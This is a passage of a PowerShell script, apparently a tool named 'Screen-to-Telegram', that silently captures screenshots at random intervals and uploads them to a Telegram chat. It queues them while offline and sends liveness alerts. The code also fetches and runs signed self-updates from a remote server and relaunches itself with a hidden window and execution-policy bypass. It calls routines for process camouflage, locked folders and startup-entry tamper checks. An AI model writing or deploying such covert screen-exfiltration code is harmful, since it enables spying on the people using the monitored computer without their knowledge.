                $old = @(Get-ChildItem -Path $rejected -Filter 'screenshot-*.jpg' -File | Sort-Object Name)
                if ($old.Count -gt 100) { $old[0..($old.Count - 101)] | Remove-Item -Force -ErrorAction SilentlyContinue }
                continue
            }
            $remaining = $pending.Count - $sent
            if ($script:LastSendErrorKind -eq 'auth') {
                Write-Log "[ERROR] Telegram refused the account, not the network. Holding $remaining screenshot(s). Check bot_token and chat_id. Reason: $($_.Exception.Message)"
            } else {
                Write-Log "Holding $remaining screenshot(s) until the connection is back. Reason: $($_.Exception.Message)"
            }
            return $sent
        }
        $sent++
        if ($keep) {
            $archive = Join-Path $folder 'sent'
            if (-not (Test-Path $archive)) { New-Item -ItemType Directory -Force -Path $archive | Out-Null }
            Move-Item -Force $item.FullName (Join-Path $archive $item.Name)
        } else {
            Remove-Item -Force $item.FullName -ErrorAction SilentlyContinue
        }
    }
    Write-Log "Sent $sent screenshot(s) to Telegram."
    return $sent
}

function Invoke-Capture($config) {
    $folder = Get-OutboxDir $config
    $path = Save-Screenshot $config $folder
    $kb = [int]((Get-Item $path).Length / 1KB)
    Write-Log "Captured: $(Split-Path -Leaf $path) ($kb KB, $($config.screenshots.quality_height)p)"
    Limit-Queue $config $folder
}

# ---------- auto-update ----------

function Update-Self($config) {
    if (-not [bool]$config.update.enabled) { return }
    $base = "$($config.update.base_url)".Trim().TrimEnd('/')
    if (-not $base -or $base.StartsWith('PASTE_')) { return }
    # Only the installed copy updates itself - never a copy run by hand from a setup folder.
    $installDir = "$($config.update.install_dir)".Trim()
    if ($installDir -and ((Resolve-Path $installDir).Path.TrimEnd('\') -ne (Resolve-Path $AppDir).Path.TrimEnd('\'))) { return }

    try {
        $pkg = (New-Object Net.WebClient).DownloadString("$base/update.json") | ConvertFrom-Json
    } catch {
        Write-Log "Update check skipped: could not read $base/update.json - $($_.Exception.Message)"
        return
    }

    try {
        $bytes = [Convert]::FromBase64String($pkg.script)
        $sig = [Convert]::FromBase64String($pkg.signature)
    } catch {
        Write-Log "[ERROR] Update rejected: update.json is malformed."
        return
    }

    $rsa = New-Object Security.Cryptography.RSACryptoServiceProvider
    $rsa.FromXmlString($UpdatePublicKey)
    if (-not $rsa.VerifyData($bytes, 'SHA256', $sig)) {
        Write-Log "[ERROR] Update rejected: signature does not match the publisher key."
        Send-Text $config ("{0}: a Screen-to-Telegram update with an invalid signature was rejected." -f $AlertPrefix)
        return
    }

    $text = [Text.Encoding]::UTF8.GetString($bytes)
    if ($text -notmatch '(?m)^\$ScriptVersion = (\d+)\s*$') {
        Write-Log "[ERROR] Update rejected: the signed script has no `$ScriptVersion line."
        return
    }
    $newVersion = [long]$Matches[1]
    if ($newVersion -le $ScriptVersion) { return }

    $errs = $null
    [void][Management.Automation.Language.Parser]::ParseInput($text, [ref]$null, [ref]$errs)
    if ($errs.Count -gt 0) {
        Write-Log "[ERROR] Update $newVersion rejected: $($errs.Count) syntax error(s), first: $($errs[0].Message)."
        return
    }

    Copy-Item -Force $ScriptPath ([IO.Path]::ChangeExtension($ScriptPath, '.prev.ps1'))
    [IO.File]::WriteAllBytes($ScriptPath, $bytes)
    Write-Log "Updated from version $ScriptVersion to $newVersion (previous kept as *.prev.ps1). Restarting."
    Send-Text $config "Screen-to-Telegram updated to version $newVersion."
    Start-Process -FilePath (Join-Path $PSHOME 'powershell.exe') `
        -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', "`"$ScriptPath`"") `
        -WindowStyle Hidden
    exit 0
}

# ---------- main ----------

function Invoke-SendOnce {
    $config = Get-Config
    Invoke-Capture $config
    Flush-Outbox $config | Out-Null
}

function Invoke-RunForever {
    $config = Get-Config

    # Only one copy should run per machine, or the startup entry and a restart
    # could both be live. A named mutex lets the first copy win; others exit.
    $createdNew = $false
    $mutex = New-Object System.Threading.Mutex($true, 'Local\ScreenToTelegram', [ref]$createdNew)
    if (-not $createdNew) {
        Write-Log "Another copy is already running. This one is exiting."
        return
    }

    $min = [double]$config.interval.min_seconds
    $max = [double]$config.interval.max_seconds
    $updateEvery = [double]$config.update.check_every_minutes
    if ($updateEvery -le 0) { $updateEvery = 60 }
    $lastCheck = (Get-Date).AddMinutes(-$updateEvery - 1)

    # A liveness ping to the recipient, so total silence always means something is
    # wrong (program stopped, or PC off) and is never mistaken for "all quiet".
    $hbEvery = [double]$config.heartbeat.every_hours
    if ($hbEvery -le 0) { $hbEvery = 0.5 }
    $lastHeartbeat = [datetime]::MinValue

    $outboxForSec = Get-OutboxDir $config
    # Camouflage process + create encrypted backup + record startup shortcut hash
    Get-ProcessDisplayName
    Invoke-BackupConfig $config
    if (Test-Path $script:StartupLnk) {
        $script:StartupLnkHash = Get-FileHash256 $script:StartupLnk
    }

    Set-OutboxAcl $outboxForSec
    $script:FsWatcher = Start-OutboxWatcher $config $outboxForSec

    Write-Log "Screen to Telegram is running. Press Ctrl+C to stop."
    Write-Log ("Random interval between {0:N0} and {1:N0} seconds." -f $min, $max)

    while ($true) {
        if (((Get-Date) - $lastCheck).TotalMinutes -ge $updateEvery) {
            $lastCheck = Get-Date
            try { Update-Self $config } catch { Write-Log "Update check failed: $($_.Exception.Message)" }
        }
        # Capture always happens, online or not. Sending drains the queue oldest-first
        # and keeps everything on failure, so nothing is lost while the net is down.
        try { Invoke-EventChecks $config } catch { Write-Log "Event check error: $($_.Exception.Message)" }
        try { Invoke-Capture $config } catch { Write-Log "Capture error: $($_.Exception.Message)" }
        try { Flush-Outbox $config | Out-Null } catch { Write-Log "Send error: $($_.Exception.Message)" }

        if (((Get-Date) - $lastHeartbeat).TotalHours -ge $hbEvery) {
            $lastHeartbeat = Get-Date
            try {
                $folder = Get-OutboxDir $config
                $pendingCount = @(Get-ChildItem -Path $folder -Filter 'screenshot-*.jpg' -File).Count
                $device = "$($config.device_name)".Trim(); if (-not $device) { $device = $env:COMPUTERNAME }
                if ($pendingCount -gt 5) {
                    # Alive, but shots are piling up and not reaching Telegram.
                    Send-Text $config ("{0} - {1}: screenshots are NOT being sent from {2}. {3} are stuck in the queue (v{4}). Check its internet and bot/chat settings." -f $AlertPrefix, $device, $device, $pendingCount, $ScriptVersion)
                } else {
                    Send-Text $config ("{0}: Screen-to-Telegram is running (v{1}, {2} shot(s) waiting to send)." -f $device, $ScriptVersion, $pendingCount)
                }
            } catch { Write-Log "Heartbeat failed: $($_.Exception.Message)" }
        }

        $wait = Get-Random -Minimum $min -Maximum $max
        Write-Log ("Next screenshot in {0:N0} seconds." -f $wait)
        Start-Sleep -Seconds $wait
    }
}

try {
    if ($Sample) { Invoke-Sample }
    elseif ($Once) { Invoke-SendOnce }
    else { Invoke-RunForever }
    exit 0
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
